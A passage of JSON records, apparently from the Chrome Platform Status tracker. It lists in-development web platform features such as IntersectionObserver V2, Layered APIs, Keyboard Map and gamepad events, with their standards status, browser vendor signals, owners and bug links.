    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://wicg.github.io/entries-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WICG/entries-api/issues/6",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>FileAPI"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/WICG/entries-api/issues/6",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Expose these types used for Directory Upload in Chrome, Firefox and Edge:\r\n\r\n* FileSystem\r\n* FileSystemEntry\r\n* FileSystemFileEntry\r\n* FileSystemDirectoryEntry\r\n* FileSystemDirectoryReader\r\n\r\nThese were previously present in Chrome under slightly different names, \r\nand not exposed by name to scripts.",
    "id": 6698113687355392,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-08-19 07:21:11.048120",
      "by": "myakura.web@gmail.com"
    },
    "name": "Frames timing functions",
    "tags": [
      "frames",
      "steps"
    ],
    "comments": "this was about to ship in M60 but reverted due to unresolved issues over naming https://github.com/w3c/csswg-drafts/issues/1301",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-timing/#frames-timing-functions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1248340",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "suzyh@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Animation"
        ],
        "flag": false,
        "bug": "http://crbug.com/646265",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Quoting the spec: \"A frames timing function is a type of timing function that divides the input time into a specified number of intervals of equal length, each of which is associated with an output progress value of increasing value. ... This makes it suitable, for example, for using in animation loops where the animation should display the first and last frame of the animation for an equal amount of time as each other frame during each loop.\" See the spec link for examples.",
    "id": 5189363944128512,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1dxY0VLynyZzPr-KSOf7eIedhC-fjGaR2NTfWMZDjSTc/edit"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-06-28 23:07:03.862047",
      "by": "mattreynolds@chromium.org"
    },
    "name": "Gamepad Button and Axis Events",
    "tags": [
      "gamepad",
      "button",
      "axis",
      "event"
    ],
    "comments": "Gamepad button and axis events are implemented in Firefox behind the flag dom.gamepad.non_standard_events.enabled.\r\n\r\nhttps://dxr.mozilla.org/mozilla-central/source/dom/webidl/GamepadAxisMoveEvent.webidl\r\nhttps://dxr.mozilla.org/mozilla-central/source/dom/webidl/GamepadButtonEvent.webidl\r\n\r\nThere is also a polyfill that provides these events on browsers that do not support them.\r\nhttps://github.com/MozillaReality/gamepad-plus/blob/master/README.md",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/w3c/gamepad/pull/15",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mattreynolds@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GamepadAPI"
        ],
        "flag": false,
        "bug": "http://crbug.com/857208",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds events for gamepadbuttondown, gamepadbuttonup, gamepadbuttonchange, and gamepadaxismove.",
    "id": 5989275208253440,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1rnQ1gU0iwPXbO7OvKS6KO9gyfpSdSQvKhK9_OkzUuKE"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:58.324930",
      "by": "ericbidelman@google.com"
    },
    "name": "HTMLObjectElement.contentWindow",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#dom-object-contentwindow",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=601771",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The contentWindow property returns the Window object of an <Object> element. This attribute is read-only, but its properties can be manipulated like the global Window object.",
    "id": 5717662780882944,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-10-23 16:55:47.884990",
      "by": "bnc@chromium.org"
    },
    "name": "HTTP/2 push header validation",
    "tags": [
      "HTTP/2",
      "h2",
      "push",
      "pushed",
      "header",
      "vary",
      "range"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1368664",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "bnc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network"
        ],
        "flag": false,
        "bug": "https://crbug.com/554220",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://jakearchibald.com/2017/h2-push-tougher-than-i-thought/#items-in-the-push-cache-should-be-matched-using-http-semantics-aside-from-freshness",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Do not serve HTTP/2 pushed streams to requests that do not match with respect to the Vary header or range parameters.",
    "id": 5652735969984512,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1J1hArmFbTuVQNdNlKzblfWovcLGFx5xwMCUlQK0HKNU"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:13.500260",
      "by": "ericbidelman@google.com"
    },
    "name": "IME API",
    "comments": "Intent to Implement: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/sxuEbPN6pPY/QpNxXgJyoScJ",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dvcs.w3.org/hg/ime-api/raw-file/default/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://www.w3.org/2012/10/30-webapps-minutes.html#item04",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "kochi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/226938",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn433247",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://www.w3.org/2012/10/30-webapps-minutes.html#item04",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Provides web applications with scripted access to an IME (input-method editor) associated with a hosting user agent.",
    "id": 6366722080636928,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:17.508930",
      "by": "ericbidelman@google.com"
    },
    "name": "Implement more KeyboardEvent/MouseEvent getModifierState() identifiers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/DOM-Level-3-Events-key/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/getModifierState",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/265458",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently only getModifierState only supports Alt, Control, Shift, Meta query modifiers.\r\n\r\nIntroduce support for the following query modifier fields:\r\nAccel, AltGraph, CapsLock, Fn, NumLock, OS, ScrollLock, Symbol.\r\n\r\nThis leaves: FnLock, Hyper, Super, SymbolLock specified but not supported. These keys typically are not generated on modern OS and keyboards. Nor does FireFox support them.",
    "id": 6685419223646208,
    "resources": {
      "docs": [
        "https://w3c.github.io/DOM-Level-3-Events-key/#keys-modifier"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-06-14 18:28:50.375000",
      "by": "ericbidelman@google.com"
    },
    "name": "IndexedDB Observers",
    "tags": [
      "indexeddb",
      "indexeddb observers",
      "database observer",
      "database listener",
      "indexeddb listener"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dmurph@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=609934",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "IndexedDB observers allow a developer to listen to changes to their database, including changes from other browsing contexts.",
    "id": 5669292892749824,
    "resources": {
      "docs": [
        "https://github.com/WICG/indexed-db-observers/blob/gh-pages/EXPLAINER.md"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/indexeddb-observers/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-22 14:30:16.300490",
      "by": "jmedley@google.com"
    },
    "name": "IntersectionObserver V2",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://szager-chromium.github.io/io-v2/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "szager@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Layout"
        ],
        "flag": false,
        "bug": "https://crbug.com/827639",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Augment IntersectionObserver to report information about occlusion and visual effects.\r\n\r\nCurrently, IntersectionObserver does not consider whether a target element has been painted over (“occluded”) by other content or whether any visual effects have been applied which may alter or obscure the element’s display. This change adds a boolean field to IntersectionObserverNotification, indicating whether the UA can guarantee that the target will be displayed unoccluded and without visual effects.",
    "id": 5878481493688320,
    "resources": {
      "docs": [
        "https://w3c.github.io/IntersectionObserver/",
        "https://szager-chromium.github.io/io-v2/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-06-15 14:09:00.190380",
      "by": "jmedley@google.com"
    },
    "name": "Intervention reports",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/WICG/reporting/blob/master/EXPLAINER.md#basic-report-formats",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "paulmeyer@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature is closely related to the previously proposed Reporting API and Reporting Observer. Intervention reports allow one type of report to be both observed by reporting observers and routed into the Reporting API backend. See the documentation links for explanations of both types.",
    "id": 5544632075157504,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/sort:relevance/blink-dev/V38Q47CxTIY/vIEsirLTDwAJ",
        "https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/sort:relevance/blink-dev/B1oztuLlzxg/tuFtADi0AgAJ"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-02-06 18:54:18.582350",
      "by": "altimin@chromium.org"
    },
    "name": "Intervention: Throttling dedicated workers when page is backgrounded",
    "tags": [
      "scheduler",
      "throttling"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "altimin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PageLifecycle",
          "Blink>Scheduling",
          "Blink>Workers"
        ],
        "flag": false,
        "bug": "http://crbug.com/776416",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "This intervention throttles work in dedicated workers associated with background pages. The mechanism is roughly similar to the one used for throttling main thread timers.",
    "id": 6334419736461312,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Fgk-jMjwucb7kKz4zcMnBG1qKJ6edq6PTylZAgZEDY0/edit#"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-09-10 22:30:55.281880",
      "by": "ericbidelman@google.com"
    },
    "name": "Intl.getCanonicalLocales()",
    "tags": [
      "Intl.getCanonicalLocales",
      "Ecma402"
    ],
    "comments": "A polyfill is available (as a part of Ecma402 spec proposal for this feature). ",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://www.ecma-international.org/ecma-402/3.0/#sec-intl.getcanonicallocales",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/getCanonicalLocales",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "jshin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>Internationalization"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5012",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Intl.getCanonicalLocales is a part of ECMAScript 2016 Internationalization API\r\n\r\nSpecification. It exposes an existing internal method to canonicalize and de-duplicate the\r\n\r\ninput locale list and returns the result in an array. ",
    "id": 5659169956823040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/getCanonicalLocales"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-16 17:47:59.879760",
      "by": "garykac@chromium.org"
    },
    "name": "Keyboard Map",
    "tags": [
      "keyboard",
      "keyboard layout",
      "localization",
      "shortcut key"
    ],
    "comments": "See Mozilla Hacks post that calls out this as a missing feature from the web platform (in \"What's missing?\" section): https://hacks.mozilla.org/2017/03/internationalize-your-keyboard-controls/\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/keyboard-map/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "garykac@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=832811",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An API that returns a map which translates from KeyboardEvent.code values into strings that can be shown to the user to identify each key.\r\n\r\nThis is not possible with existing web platform APIs because the value that should be shown to the user depends on the keyboard layouts that the user has installed and active. ",
    "id": 6730004075380736,
    "resources": {
      "docs": [
        "Original WICG incubation proposal: https://discourse.wicg.io/t/keyboardevent-getcharacterbykey-key-modifierlist/1857/3",
        "Explainer: https://github.com/WICG/keyboard-map/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "Layered APIs",
    "updated": {
      "when": "2018-05-02 19:09:58.771640",
      "by": "jmedley@google.com"
    },
    "name": "Layered API infrastructure",
    "tags": [
      "script",
      "modules",
      "javascript"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/drufball/layered-apis/blob/master/spec.md",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "hiroshige@chromium.org",
          "dknox@chromium.org",
          "ojan@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML>Script"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=829084",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Layered APIs (LAPIs) are a new standards effort for shipping high-level features, exposed to the web as JavaScript modules. Their specifications are are required to be layered on top of existing lower-level platform features, and never use any \"magic\" that is inaccessible to JS developers.\r\n\r\nThis feature covers the infrastructure for importing LAPIs, via std:x|y module specifiers in <script type=module> and JS import statements.",
    "id": 6555299569729536,
    "resources": {
      "docs": [
        "https://github.com/drufball/layered-apis/blob/master/README.md"
      ]
    }
  },
  {
    "category": "Layered APIs",
    "updated": {
      "when": "2018-06-05 15:51:08.386340",
      "by": "ericbidelman@google.com"
    },
    "name": "Layered API: <virtual-scroller>",
    "tags": [
      "virtual list",
      "infinite list",
      "virtual-scroller",
      "layered api",
      "lapi",
      "layered apis",
      "lapis"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "domenic@chromium.org",
          "valdrin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The <virtual-scroller> element maps a provided set of JavaScript objects onto DOM nodes, and renders only the DOM nodes that are currently visible, leaving the rest \"virtualized\". It will be implemented as a layered API.",
    "id": 5673195159945216,
    "resources": {
      "docs": [
        "https://github.com/valdrinkoshi/virtual-scroller/blob/master/README.md"
      ],
      "samples": [
        "https://valdrinkoshi.github.io/virtual-scroller/",
        "https://valdrinkoshi.github.io/virtual-scroller/demo/index.html"
      ]
    }
  },
  {
    "category": "Layered APIs",
    "updated": {
      "when": "2018-05-02 19:11:29.504840",
      "by": "jmedley@google.com"
    },
    "name": "Layered API: async local storage",
    "tags": [
      "local storage",
      "async local storage",
      "lapi",
      "lapis",
      "layered api",
      "layered apis"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://domenic.github.io/async-local-storage/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Storage"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Async local storage provides a simple, asynchronous key/value store with a modern API. Additionally, it allows easy creation of isolated storage areas beyond the default one.\r\n\r\nAsync local storage is a new layered API. It is layered on top of IndexedDB, storing its data in a specific database, so the developer can fall back to using IndexedDB directly when necessary.",
    "id": 6428344899862528,
    "resources": {
      "docs": [
        "https://github.com/domenic/async-local-storage/blob/master/README.md"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:32.673210",
      "by": "ericbidelman@google.com"
    },
    "name": "Make document.documentURI behavior match document.URL and DOM spec",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dom.spec.whatwg.org/#concept-document-url",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-whatwg-archive/2011Jun/0388.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/471239",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "1. Make document.documentURI non-nullable to match document.URL.\r\n2. Use about:blank URL for create*Document()-created documents instead of an empty string.",
    "id": 4879378597019648,
    "resources": {
      "docs": [
        "Legacy spec:",
        "http://www.w3.org/TR/2004/REC-DOM-Level-3-Core-20040407/core#Document3-documentURI",
        "",
        "Discussion to change this behavior:",
        "https://lists.w3.org/Archives/Public/public-whatwg-archive/2011Jun/0388.html",
        "https://lists.w3.org/Archives/Public/public-whatwg-archive/2012Jun/0249.html"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-08-10 15:20:57.310700",
      "by": "ericbidelman@google.com"
    },
    "name": "Media Capture Depth Stream Extensions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/mediacapture-depth/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://wiki.mozilla.org/Project_FoxEye",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "aleksandar.stojiljkovic@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GetUserMedia"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=616098",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support Media Capture Depth Stream Extension, which enables to use depth stream camera.",
    "id": 5713419084759040,
    "resources": {
      "docs": [
        "https://www.w3.org/wiki/Media_Capture_Depth_Stream_Extension"
      ],
      "samples": [
        "https://developers.google.com/glass/samples/mini-games",
        "https://github.com/huningxin/depth_stream_examples"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-20 18:21:04.756010",
      "by": "Patket@microsoft.com"
    },
    "name": "Media Queries: shape feature",
    "comments": "The feature name was changed to 'shape'. For more details, see https://groups.google.com/a/chromium.org/d/msg/blink-dev/SriPY5CUjaI/Ep7RbSTYAQAJ\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-round-display-1/#shape-media-feature",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "joone.hur@intel.com",
          "hyojin22.song@lge.com",
          "jh.hong@lge.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=535803",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
